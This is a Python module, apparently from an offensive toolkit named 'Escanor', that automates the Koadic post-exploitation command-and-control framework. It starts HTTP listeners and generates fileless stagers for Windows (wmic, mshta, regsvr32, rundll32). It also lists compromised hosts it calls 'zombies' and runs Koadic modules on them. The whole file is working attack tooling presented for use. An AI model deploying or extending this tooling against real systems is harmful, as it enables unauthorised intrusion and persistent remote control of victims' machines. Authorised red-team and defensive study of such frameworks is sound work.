"""
Escanor Module: Koadic Integration
Integrates with Koadic COM-based post-exploitation framework.
Uses JScript/VBScript for fileless attacks via Windows Script Host.
"""

import os
import subprocess
import json
from typing import Dict, List, Optional, Any
from core.base_module import BaseModule
from core.module_result import ModuleResult


class KoadicModule(BaseModule):
    """
    Module to interface with Koadic framework.
    Requires Koadic to be installed and configured separately.
    
    This module exposes multiple fine-grained actions for precise control:
    - list_modules: List available Koadic modules
    - start_listener: Start a Koadic listener
    - generate_stager: Generate a stager payload
    - execute_module: Execute a module on a zombie
    - list_zombies: List active zombies
    """

    def __init__(self):
        super().__init__()
        self.name = "koadic"
        self.display_name = "Koadic Integration"
        self.description = "Interface with Koadic COM-based post-exploitation framework for fileless attacks"
        self.author = "Escanor Team"
        self.version = "1.0.0"
        self.category = "c2_frameworks"
        self.tags = ["c2", "koadic", "com", "fileless", "jscript", "vbscript"]
        self.requirements = [
            "Koadic installed (https://github.com/offsecginger/koadic)",
            "Python 3.x",
            "Network access to target Windows systems"
        ]
        
        # Configuration options
        self.options = {
            "koadic_path": {
                "value": "/opt/koadic",
                "required": True,
                "description": "Path to Koadic installation directory"
            },
            "listener_host": {
                "value": "0.0.0.0",
                "required": True,
                "description": "Host IP for Koadic listener"
            },
            "listener_port": {
                "value": "9999",
                "required": True,
                "description": "Port for Koadic listener"
            },
            "stager_type": {
                "value": "js/wmic",
                "required": False,
                "description": "Type of stager (js/wmic, js/mshta, vbs/regsvr32, etc.)"
            },
            "target": {
                "value": "",
                "required": False,
                "description": "Target IP or hostname"
            }
        }
        
        # Register fine-grained actions
        self.register_action(
            name="list_modules",
            description="List all available Koadic modules",
            method_name="run",
            tags=["recon", "modules"]
        )
        
        self.register_action(
            name="start_listener",
            description="Start a Koadic listener to receive connections",
            method_name="start_listener",
            required_options=["listener_host", "listener_port"],
            tags=["setup", "listener"]
        )
        
        self.register_action(
            name="generate_stager",
            description="Generate a stager payload for deployment",
            method_name="generate_stager",
            required_options=["listener_host", "listener_port"],
            optional_options=["stager_type"],
            tags=["payload", "offense"]
        )
        
        self.register_action(
            name="execute_module",
            description="Execute a Koadic module on a specific zombie",
            method_name="execute_module_wrapper",
            required_options=["zombie_id", "module_name"],
            tags=["execution", "post-exploitation"]
        )
        
        self.register_action(
            name="list_zombies",
            description="List all active zombies (compromised hosts)",
            method_name="list_zombies",
            tags=["recon", "zombies"]
        )

    def check_requirements(self) -> bool:
        """Check if Koadic is installed and accessible."""
        try:
            koadic_path = self.get_option("koadic_path")
            
            if not os.path.exists(koadic_path):
                self.log_error(f"Koadic not found at {koadic_path}")
                return False
            
            # Check for main executable
            koadic_cli = os.path.join(koadic_path, "koadic.py")
            if not os.path.exists(koadic_cli):
                # Try alternative
                koadic_cli = os.path.join(koadic_path, "bin", "koadic")
                if not os.path.exists(koadic_cli):
                    self.log_error("Koadic CLI not found")
                    return False
            
            # Test if Python can import required modules
            test_cmd = ["python3", "-c", "import socket, http.server"]
            result = subprocess.run(test_cmd, capture_output=True, timeout=5)
            
            if result.returncode != 0:
                self.log_error("Required Python modules not available")
                return False
            
            self.log_info("Koadic installation verified")
            return True
            
        except Exception as e:
            self.log_error(f"Requirement check failed: {str(e)}")
            return False

    def run(self) -> ModuleResult:
        """Execute Koadic operations - list available modules and zombies."""
        result = ModuleResult()
        
        try:
            koadic_path = self.get_option("koadic_path")
            koadic_cli = os.path.join(koadic_path, "koadic.py")
            
            if not os.path.exists(koadic_cli):
                koadic_cli = os.path.join(koadic_path, "bin", "koadic")
            
            # List available modules
            cmd = ["python3", koadic_cli, "--list-modules"]
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30,
                cwd=koadic_path
            )
            
            modules_output = process.stdout
            
            result.success = True
            result.data = {
                "modules_output": modules_output,
                "message": "Retrieved Koadic module list"
            }
            
            self.log_success("Successfully connected to Koadic")
            self.log_info(f"Available modules listed")
            
        except subprocess.TimeoutExpired:
            result.success = False
            result.error = "Koadic command timed out"
            self.log_error("Koadic operation timed out")
        except Exception as e:
            result.success = False
            result.error = str(e)
            self.log_error(f"Koadic operation failed: {str(e)}")
        
        return result

    def start_listener(self, background: bool = True) -> ModuleResult:
        """Start a Koadic listener."""
        result = ModuleResult()
        
        try:
            koadic_path = self.get_option("koadic_path")
            koadic_cli = os.path.join(koadic_path, "koadic.py")
            
            if not os.path.exists(koadic_cli):
                koadic_cli = os.path.join(koadic_path, "bin", "koadic")
            
            host = self.get_option("listener_host")
            port = self.get_option("listener_port")
            
            # Prepare listener command
            cmd = ["python3", koadic_cli]
            
            if background:
                # Run in background
                process = subprocess.Popen(
                    cmd,
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    cwd=koadic_path
                )
                
                # Send commands to start listener
                commands = f"use listener/http\nset Host {host}\nset Port {port}\nexecute\n"
                
                stdout, stderr = process.communicate(input=commands, timeout=10)
                
                result.success = True
                result.data = {
                    "stdout": stdout,
                    "stderr": stderr,
                    "listener_host": host,
                    "listener_port": port,
                    "message": f"Listener started on {host}:{port}"
                }
                self.log_success(f"Koadic listener started on {host}:{port}")
            else:
                result.success = False
                result.error = "Foreground mode not implemented yet"
            
        except subprocess.TimeoutExpired:
            result.success = False
            result.error = "Listener startup timed out"
        except Exception as e:
            result.success = False
            result.error = str(e)
            self.log_error(f"Failed to start listener: {str(e)}")
        
        return result

    def generate_stager(self, stager_type: str = None, listener_id: str = "0") -> ModuleResult:
        """Generate a Koadic stager payload."""
        result = ModuleResult()
        
        try:
            koadic_path = self.get_option("koadic_path")
            stager = stager_type or self.get_option("stager_type")
            host = self.get_option("listener_host")
            port = self.get_option("listener_port")
            
            # Map stager types to Koadic module paths
            stager_map = {
                "js/wmic": "stager/js/wmic",
                "js/mshta": "stager/js/mshta",
                "vbs/regsvr32": "stager/vbs/regsvr32",
                "js/rundll32_js": "stager/js/rundll32_js",
                "py/powershell": "stager/py/powershell"
            }
            
            stager_module = stager_map.get(stager, f"stager/{stager}")
            
            # Generate stager using Koadic CLI
            koadic_cli = os.path.join(koadic_path, "koadic.py")
            
            commands = f"use {stager_module}\nset Listener {listener_id}\nset Host {host}\nset Port {port}\nexecute\n"
            
            process = subprocess.Popen(
                ["python3", koadic_cli],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=koadic_path
            )
            
            stdout, stderr = process.communicate(input=commands, timeout=30)
            
            result.success = True
            result.data = {
                "stager_type": stager,
                "payload": stdout,
                "stderr": stderr,
                "message": f"Generated {stager} stager"
            }
            
            self.log_success(f"Generated {stager} stager payload")
            
            # Extract and display the actual payload
            if "mshta" in stager or "wmic" in stager:
                self.log_info("Payload generated - deploy to target system")
            
        except subprocess.TimeoutExpired:
            result.success = False
            result.error = "Stager generation timed out"
        except Exception as e:
            result.success = False
            result.error = str(e)
            self.log_error(f"Failed to generate stager: {str(e)}")
        
        return result

    def execute_module_wrapper(self) -> ModuleResult:
        """Wrapper for execute_module action to work with the action system.
        
        This wrapper reads ZOMBIE_ID and MODULE_NAME from options and calls execute_module.
        Additional options can be passed via EXECUTE_OPTIONS.
        """
        zombie_id = self.get_option("zombie_id")
        module_name = self.get_option("module_name")
        
        if not zombie_id or not module_name:
            result = ModuleResult()
            result.success = False
            result.error = "Missing required options: zombie_id and module_name"
            return result
        
        # Parse additional options if provided
        exec_options_str = self.get_option("execute_options") or ""
        exec_options = {}
        if exec_options_str:
            # Parse comma-separated key=value pairs
            for pair in exec_options_str.split(","):
                if "=" in pair:
                    key, value = pair.split("=", 1)
                    exec_options[key.strip()] = value.strip()
        
        return self.execute_module(zombie_id, module_name, exec_options)
    
    def execute_module(self, zombie_id: str, module_name: str, options: Dict = None) -> ModuleResult:
        """Execute a Koadic module on a specific zombie."""
        result = ModuleResult()
        
        try:
            koadic_path = self.get_option("koadic_path")
            koadic_cli = os.path.join(koadic_path, "koadic.py")
            
            # Build command sequence
            commands = f"use {module_name}\n"
            
            if options:
                for key, value in options.items():
                    commands += f"set {key} {value}\n"
            
            commands += f"set Zombie {zombie_id}\nexecute\n"
            
            process = subprocess.Popen(
                ["python3", koadic_cli],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=koadic_path
            )
            
            stdout, stderr = process.communicate(input=commands, timeout=60)
            
            result.success = True
            result.data = {
                "module": module_name,
                "zombie_id": zombie_id,
                "output": stdout,
                "errors": stderr,
                "message": f"Executed {module_name} on zombie {zombie_id}"
            }
            
            self.log_success(f"Module {module_name} executed on zombie {zombie_id}")
            
        except subprocess.TimeoutExpired:
            result.success = False
            result.error = "Module execution timed out"
        except Exception as e:
            result.success = False
            result.error = str(e)
            self.log_error(f"Module execution failed: {str(e)}")
        
        return result

    def list_zombies(self) -> ModuleResult:
        """List all active zombies (compromised hosts)."""
        result = ModuleResult()
        
        try:
            koadic_path = self.get_option("koadic_path")
            koadic_cli = os.path.join(koadic_path, "koadic.py")
            
            commands = "zombies\n"
            
            process = subprocess.Popen(
                ["python3", koadic_cli],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                cwd=koadic_path
            )
            
            stdout, stderr = process.communicate(input=commands, timeout=10)
            
            result.success = True
            result.data = {
                "zombies_output": stdout,
                "message": "Retrieved zombie list"
            }
            
        except Exception as e:
            result.success = False
            result.error = str(e)
            self.log_error(f"Failed to list zombies: {str(e)}")
        
        return result
